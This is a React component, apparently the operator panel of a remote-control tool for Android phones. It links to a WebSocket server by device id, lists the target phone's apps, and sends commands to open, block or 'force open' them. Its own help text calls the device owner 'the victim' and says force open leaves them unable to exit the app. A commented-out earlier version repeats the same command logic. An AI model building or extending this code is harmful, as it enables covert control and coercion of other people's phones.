import React, { useEffect, useState } from "react";
import { useSearchParams } from "react-router-dom";
import "./style.css";
import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
import {
  faFile,
  faLock,
  faArrowUpRightFromSquare,
  faUserSecret,
  faDumbbell,
  faUnlock,
  faLockOpen,
  faWrench,
  faToolbox,
  faBell,
} from "@fortawesome/free-solid-svg-icons";
import Youtube from "./yt.png";
import { faGooglePlay } from "@fortawesome/free-brands-svg-icons";

function AphoneDetails() {
  const [searchParams] = useSearchParams();
  const id = searchParams.get("id");
  const [apps, setApps] = useState([]);
  const [socket, setSocket] = useState(null);
  const [blockedApps, setBlockedApps] = useState([]);
  const [forceOpenedApps, setForceOpenedApps] = useState([]);
  const [popupActive, setPopupActive] = useState(false);

  useEffect(() => {
    if (!id) return;

    const ws = new WebSocket(`wss://ws-ryzt.onrender.com/${id}`);

    ws.onopen = () => {
      console.log("✅ Conectado com sucesso");
    };

    ws.onmessage = (e) => {
      console.log("📥 Mensagem recebida:", e.data);
    };

    ws.onerror = () => {
      console.error("❌ Erro na conexão WebSocket");
    };

    ws.onclose = () => {
      console.log("🔌 Conexão encerrada");
    };

    setSocket(ws);

    return () => {
      ws.close();
    };
  }, [id]);

  useEffect(() => {
    const fetchApps = async () => {
      try {
        const res = await fetch(
          `https://backend-ryzt.onrender.com/application?id=${id}&app=true`
        );
        const data = await res.json();
        if (data?.apps) {
          setApps(data.apps);
        }
      } catch (err) {
        console.error("Erro ao buscar dados do app:", err);
      }
    };

    if (id) {
      fetchApps();

      const storedBlocked =
        JSON.parse(localStorage.getItem(`blockedApps-${id}`)) || [];
      const storedForce =
        JSON.parse(localStorage.getItem(`forceApps-${id}`)) || [];

      setBlockedApps(storedBlocked);
      setForceOpenedApps(storedForce);
    }
  }, [id]);

  const toggleBlock = (pkg) => {
    const isAlreadyBlocked = blockedApps.includes(pkg);
    const newState = isAlreadyBlocked
      ? blockedApps.filter((p) => p !== pkg)
      : [...blockedApps, pkg];

    setBlockedApps(newState);
    localStorage.setItem(`blockedApps-${id}`, JSON.stringify(newState));

    if (socket && socket.readyState === WebSocket.OPEN) {
      socket.send(
        JSON.stringify({
          type: isAlreadyBlocked ? "remove" : "store",
          deviceId: id,
          packageName: pkg,
          mode: "Block App",
        })
      );
    }
  };

  const toggleForceOpen = (pkg) => {
    const isAlreadyForced = forceOpenedApps.includes(pkg);
    const newState = isAlreadyForced
      ? forceOpenedApps.filter((p) => p !== pkg)
      : [...forceOpenedApps, pkg];

    setForceOpenedApps(newState);
    localStorage.setItem(`forceApps-${id}`, JSON.stringify(newState));

    if (socket && socket.readyState === WebSocket.OPEN) {
      socket.send(
        JSON.stringify({
          type: isAlreadyForced ? "remove" : "store",
          deviceId: id,
          packageName: pkg,
          mode: "Force Open",
        })
      );
    }
  };

  const handleOpenApp = (packageName) => {
    if (socket && socket.readyState === WebSocket.OPEN) {
      socket.send(
        JSON.stringify({
          type: "package",
          package: packageName,
          mode: "normal",
          deviceId: id,
        })
      );
      console.log(`📦 Enviado: ${packageName}`);
    } else {
      console.warn("⚠️ WebSocket não está conectado");
    }
  };

  useEffect(() => {
    const fetchApps = async () => {
      try {
        const res = await fetch(
          `https://backend-ryzt.onrender.com/application?id=${id}&app=true`
        );
        const data = await res.json();
        if (data?.apps) {
          setApps(data.apps);
        }
      } catch (err) {
        console.error("Erro ao buscar dados do app:", err);
      }
    };

    if (id) {
      fetchApps();
    }
  }, [id]);
  return (
    <>
      <p className="turial">
        <FontAwesomeIcon
          icon={faArrowUpRightFromSquare}
          color="#b9b9bb"
          style={{ fontSize: "13px" }}
          className="ico"
        />
        <span> Open </span> opens the application.{" "}
        <FontAwesomeIcon
          icon={faLock}
          color="#b9b9bb"
          style={{ fontSize: "13px" }}
          className="ico"
        />
        <span>Block App </span>
        makes the victim unable to open the application.
        <br />
        <FontAwesomeIcon
          icon={faUnlock}
          color="#b9b9bb"
          style={{ fontSize: "13px" }}
          className="ico"
        />
        <span>Unblock </span> removes the block from the app.
        <FontAwesomeIcon
          icon={faDumbbell}
          color="#b9b9bb"
          style={{ fontSize: "13px" }}
          className="ico"
        />
        <span>Force Open </span>
        opens the application and remains in the application without being able
        to exit.
      </p>

      <div className="main-aplications">
        <div className="mainofall">
          <div className="app-mvd">
            <div className="app-mvd">
              {apps.length > 0 && (
                <div
                  className="aplicativo"
                  onClick={() => setPopupActive(true)}
                >
                  <div className="inf">
                    <div className="icon">
                      <img src={apps[0].img} alt={apps[0].name} />
                    </div>

                    <div className="text">
                      <h1>
                        {apps[0].name} - {apps[0].mb}
                      </h1>
                      <p>
                        {apps[0].package} <span>Não Está sendo usado</span>
                      </p>
                    </div>
                  </div>

                  <div
                    className="touch"
                    onClick={(e) => {
                      e.stopPropagation();
                      setPopupActive(true);
                    }}
                  >
                    Escolher Outro
                  </div>

                  <div className={`popup-app ${popupActive ? "a" : ""}`}>
                    {apps.slice(1).map((app, index) => (
                      <div
                        className="aplicativo"
                        key={index}
                        onClick={(e) => {
                          e.stopPropagation();
                          const newApps = [...apps];
                          const selected = newApps.splice(index + 1, 1)[0];
                          newApps.unshift(selected);
                          setApps(newApps);
                          setPopupActive(false);
                        }}
                      >
                        <div className="inf">
                          <div className="icon">
                            <img src={app.img} alt={app.name} />
                          </div>

                          <div className="text">
                            <h1>
                              {app.name} - {app.mb}
                            </h1>
                            <p>
                              {app.package} <span>Não Está sendo usado</span>
                            </p>
                          </div>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              )}
            </div>

            <div className="mvd-main">
              <div className="actions">
                <div className="cabecario">
                  <div className="cnt">
                    <div className="icon">
                      <FontAwesomeIcon
                        icon={faToolbox}
                        color="#b9b9bb"
                        style={{ fontSize: "13px" }}
                      />
                    </div>
                    <h1>Controle</h1>
                  </div>
                </div>

                <div className="action-main">
                  <div className="action-box">
                    <FontAwesomeIcon
                      icon={faArrowUpRightFromSquare}
                      color="#b9b9bb"
                      style={{ fontSize: "13px" }}
                    />
                    <h1>Abrir</h1>
                  </div>

                  <div className="action-box">
                    <FontAwesomeIcon
                      icon={faDumbbell}
                      color="#b9b9bb"
                      style={{ fontSize: "13px" }}
                    />
                    <h1>Forçar Abrir</h1>
                  </div>

                  <div className="action-box">
                    <FontAwesomeIcon
                      icon={faLock}
                      color="#b9b9bb"
                      style={{ fontSize: "13px" }}
                    />
                    <h1>Proibir Abrir</h1>
                  </div>

                  <div className="action-box d">
                    <FontAwesomeIcon
                      icon={faWrench}
                      color="#b9b9bb"
                      style={{ fontSize: "13px" }}
                    />
                    <h1>Definir limite Diario</h1>

                    <div className="popup-action">
                      <div className="box-ac">
                        <p>1 Minutos</p>
                      </div>
                      <div className="box-ac">
                        <p>5 Minutos</p>
                      </div>
                      <div className="box-ac">
                        <p>10 Minutos</p>
                      </div>
                      <div className="box-ac">
                        <p>30 Minutos</p>
                      </div>
                      <div className="box-ac">
                        <p>1 Hora</p>
                      </div>
                      <div className="box-ac">
                        <p>2 Horas</p>
                      </div>
                      <div className="box-ac">
                        <p>3 Horas</p>
                      </div>
                      <div className="box-ac">
                        <p>4 Horas</p>
                      </div>
                      <div className="box-ac">
                        <p>5 Horas</p>
                      </div>
                      <div className="box-ac">
                        <p>6 Horas</p>
                      </div>
                      <div className="box-ac">
                        <p>7 Horas</p>
                      </div>
                      <div className="box-ac">
                        <p>8 Horas</p>
                      </div>
                      <div className="box-ac">
                        <p>9 Horas</p>
                      </div>
                      <div className="box-ac">
                        <p>10 Horas</p>
                      </div>
                    </div>
                  </div>
                </div>
              </div>

              <div className="notificacoes">
                <div className="actions">
                  <div className="cabecario">
                    <div className="cnt">
                      <div className="icon">
                        <FontAwesomeIcon
                          icon={faBell}
                          color="#b9b9bb"
                          style={{ fontSize: "13px" }}
                        />
                      </div>
                      <h1>Informações Diárias</h1>
                    </div>
                  </div>

                  <div className="box-notf" style={{ marginTop: "40px" }}>
                    <p>
                      Aplicativo foi Aberto as <span>10:30</span>
                    </p>
                    <h2>10:30 - 12/08/2025</h2>
                  </div>

                  <div className="box-notf">
                    <p>
                      Aplicativo foi Fechado as <span>10:30</span>
                    </p>
                    <h2>10:30 - 12/08/2025</h2>
                  </div>

                  <div className="box-notf">
                    <p>
                      Aplicativo foi Fechado as <span>10:30</span>
                    </p>
                    <h2>10:30 - 12/08/2025</h2>
                  </div>

                  <div className="box-notf">
                    <p>
                      Aplicativo foi Fechado as <span>10:30</span>
                    </p>
                    <h2>10:30 - 12/08/2025</h2>
                  </div>

                  <div className="box-notf">
                    <p>
                      Aplicativo foi Fechado as <span>10:30</span>
                    </p>
                    <h2>10:30 - 12/08/2025</h2>
                  </div>

                  <div className="box-notf">
                    <p>
                      Aplicativo foi Fechado as <span>10:30</span>
                    </p>
                    <h2>10:30 - 12/08/2025</h2>
                  </div>

                  <div className="box-notf">
                    <p>
                      Aplicativo foi Fechado as <span>10:30</span>
                    </p>
                    <h2>10:30 - 12/08/2025</h2>
                  </div>

                  <div className="box-notf">
                    <p>
                      Aplicativo foi Fechado as <span>10:30</span>
                    </p>
                    <h2>10:30 - 12/08/2025</h2>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <div className="global-main">
            <div className="cabecario">
              <div className="cnt">
                <div className="icon">
                  <FontAwesomeIcon
                    icon={faGooglePlay}
                    color="#b9b9bb"
                    style={{ fontSize: "15px" }}
                  />
                </div>
                <h1>Todos Apps</h1>
              </div>
            </div>

            <div className="action-main">
              <div className="action-box">
                <FontAwesomeIcon
                  icon={faLock}
                  color="#b9b9bb"
                  style={{ fontSize: "13px" }}
                />
                <h1>Proibir Todos Apps</h1>
              </div>

              <div className="action-box d">
                <FontAwesomeIcon
                  icon={faWrench}
                  color="#b9b9bb"
                  style={{ fontSize: "13px" }}
                />
                <h1>Definir limite Diario em Todos Apps</h1>

                <div className="popup-action">
                  <div className="box-ac">
                    <p>1 Minutos</p>
                  </div>
                  <div className="box-ac">
                    <p>5 Minutos</p>
                  </div>
                  <div className="box-ac">
                    <p>10 Minutos</p>
                  </div>
                  <div className="box-ac">
                    <p>30 Minutos</p>
                  </div>
                  <div className="box-ac">
                    <p>1 Hora</p>
                  </div>
                  <div className="box-ac">
                    <p>2 Horas</p>
                  </div>
                  <div className="box-ac">
                    <p>3 Horas</p>
                  </div>
                  <div className="box-ac">
                    <p>4 Horas</p>
                  </div>
                  <div className="box-ac">
                    <p>5 Horas</p>
                  </div>
                  <div className="box-ac">
                    <p>6 Horas</p>
                  </div>
                  <div className="box-ac">
                    <p>7 Horas</p>
                  </div>
                  <div className="box-ac">
                    <p>8 Horas</p>
                  </div>
                  <div className="box-ac">
                    <p>9 Horas</p>
                  </div>
                  <div className="box-ac">
                    <p>10 Horas</p>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </>
  );
}

export default AphoneDetails;

// import React, { useEffect, useState } from "react";
// import { useSearchParams } from "react-router-dom";
// import "./style.css";
// import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
// import {
//   faFile,
//   faLock,
//   faArrowUpRightFromSquare,
//   faUserSecret,
//   faDumbbell,
//   faUnlock,
//   faLockOpen,
// } from "@fortawesome/free-solid-svg-icons";
// // import { faWhatsapp } from "@fortawesome/free-brands-svg-icons";

// function AphoneDetails() {
//   const [searchParams] = useSearchParams();
//   const id = searchParams.get("id");
//   const [apps, setApps] = useState([]);
//   const [socket, setSocket] = useState(null);
//   const [blockedApps, setBlockedApps] = useState([]);
//   const [forceOpenedApps, setForceOpenedApps] = useState([]);

//   useEffect(() => {
//     if (!id) return;

//     const ws = new WebSocket(`wss://ws-ryzt.onrender.com/${id}`);

//     ws.onopen = () => {
//       console.log("✅ Conectado com sucesso");
//     };

//     ws.onmessage = (e) => {
//       console.log("📥 Mensagem recebida:", e.data);
//     };

//     ws.onerror = () => {
//       console.error("❌ Erro na conexão WebSocket");
//     };

//     ws.onclose = () => {
//       console.log("🔌 Conexão encerrada");
//     };

//     setSocket(ws);

//     return () => {
//       ws.close();
//     };
//   }, [id]);

//   useEffect(() => {
//     const fetchApps = async () => {
//       try {
//         const res = await fetch(
//           `https://backend-ryzt.onrender.com/application?id=${id}&app=true`
//         );
//         const data = await res.json();
//         if (data?.apps) {
//           setApps(data.apps);
//         }
//       } catch (err) {
//         console.error("Erro ao buscar dados do app:", err);
//       }
//     };

//     if (id) {
//       fetchApps();

//       const storedBlocked =
//         JSON.parse(localStorage.getItem(`blockedApps-${id}`)) || [];
//       const storedForce =
//         JSON.parse(localStorage.getItem(`forceApps-${id}`)) || [];

//       setBlockedApps(storedBlocked);
//       setForceOpenedApps(storedForce);
//     }
//   }, [id]);

//   const toggleBlock = (pkg) => {
//     const isAlreadyBlocked = blockedApps.includes(pkg);
//     const newState = isAlreadyBlocked
//       ? blockedApps.filter((p) => p !== pkg)
//       : [...blockedApps, pkg];

//     setBlockedApps(newState);
//     localStorage.setItem(`blockedApps-${id}`, JSON.stringify(newState));

//     if (socket && socket.readyState === WebSocket.OPEN) {
//       socket.send(
//         JSON.stringify({
//           type: isAlreadyBlocked ? "remove" : "store",
//           deviceId: id,
//           packageName: pkg,
//           mode: "Block App",
//         })
//       );
//     }
//   };

//   const toggleForceOpen = (pkg) => {
//     const isAlreadyForced = forceOpenedApps.includes(pkg);
//     const newState = isAlreadyForced
//       ? forceOpenedApps.filter((p) => p !== pkg)
//       : [...forceOpenedApps, pkg];

//     setForceOpenedApps(newState);
//     localStorage.setItem(`forceApps-${id}`, JSON.stringify(newState));

//     if (socket && socket.readyState === WebSocket.OPEN) {
//       socket.send(
//         JSON.stringify({
//           type: isAlreadyForced ? "remove" : "store",
//           deviceId: id,
//           packageName: pkg,
//           mode: "Force Open",
//         })
//       );
//     }
//   };

//   const handleOpenApp = (packageName) => {
//     if (socket && socket.readyState === WebSocket.OPEN) {
//       socket.send(
//         JSON.stringify({
//           type: "package",
//           package: packageName,
//           mode: "normal",
//           deviceId: id,
//         })
//       );
//       console.log(`📦 Enviado: ${packageName}`);
//     } else {
//       console.warn("⚠️ WebSocket não está conectado");
//     }
//   };

//   useEffect(() => {
//     const fetchApps = async () => {
//       try {
//         const res = await fetch(
//           `https://backend-ryzt.onrender.com/application?id=${id}&app=true`
//         );
//         const data = await res.json();
//         if (data?.apps) {
//           setApps(data.apps);
//         }
//       } catch (err) {
//         console.error("Erro ao buscar dados do app:", err);
//       }
//     };

//     if (id) {
//       fetchApps();
//     }
//   }, [id]);
//   return (
//     <>
//       <p className="turial">
//         <FontAwesomeIcon
//           icon={faArrowUpRightFromSquare}
//           color="#b9b9bb"
//           style={{ fontSize: "13px" }}
//           className="ico"
//         />
//         <span> Open </span> opens the application.{" "}
//         <FontAwesomeIcon
//           icon={faLock}
//           color="#b9b9bb"
//           style={{ fontSize: "13px" }}
//           className="ico"
//         />
//         <span>Block App </span>
//         makes the victim unable to open the application.
//         <br />
//         <FontAwesomeIcon
//           icon={faUnlock}
//           color="#b9b9bb"
//           style={{ fontSize: "13px" }}
//           className="ico"
//         />
//         <span>Unblock </span> removes the block from the app.
//         <FontAwesomeIcon
//           icon={faDumbbell}
//           color="#b9b9bb"
//           style={{ fontSize: "13px" }}
//           className="ico"
//         />
//         <span>Force Open </span>
//         opens the application and remains in the application without being able
//         to exit.
//       </p>
//       <div className="main-aplications">
//         {apps.map((app, index) => {
//           const isBlocked = blockedApps.includes(app.package);
//           const isForceOpen = forceOpenedApps.includes(app.package);

//           return (
//             <div key={app.package || index} className="box-app">
//               <div className="app-icon">
//                 <FontAwesomeIcon
//                   icon={faFile}
//                   color="#b9b9bb"
//                   style={{ fontSize: "40px" }}
//                 />
//               </div>

//               <div className="txt">
//                 <h1>{app.name}</h1>
//                 <p>— MB | --/--/----</p>
//               </div>

//               <div className="functions">
//                 <div
//                   className="touch"
//                   onClick={() => handleOpenApp(app.package)}
//                 >
//                   <FontAwesomeIcon
//                     icon={faArrowUpRightFromSquare}
//                     color="#b9b9bb"
//                     style={{ fontSize: "13px" }}
//                   />
//                   <p>Abrir</p>
//                 </div>

//                 <div
//                   className={`touch ${isBlocked ? "a" : ""}`}
//                   onClick={() => toggleBlock(app.package)}
//                 >
//                   <FontAwesomeIcon
//                     icon={isBlocked ? faUnlock : faLock}
//                     color="#b9b9bb"
//                     style={{ fontSize: "13px" }}
//                   />
//                   <p>{isBlocked ? "Desbloqueiar App" : "Bloqueiar App"}</p>
//                 </div>

//                 <div
//                   className={`touch ${isForceOpen ? "a" : ""}`}
//                   onClick={() => toggleForceOpen(app.package)}
//                 >
//                   <FontAwesomeIcon
//                     icon={faDumbbell}
//                     color="#b9b9bb"
//                     style={{ fontSize: "13px" }}
//                   />
//                   <p>{isForceOpen ? "Parar de Força" : "Força Abrir"}</p>
//                 </div>
//               </div>
//             </div>
//           );
//         })}
//       </div>
//     </>
//   );
// }

// export default AphoneDetails;
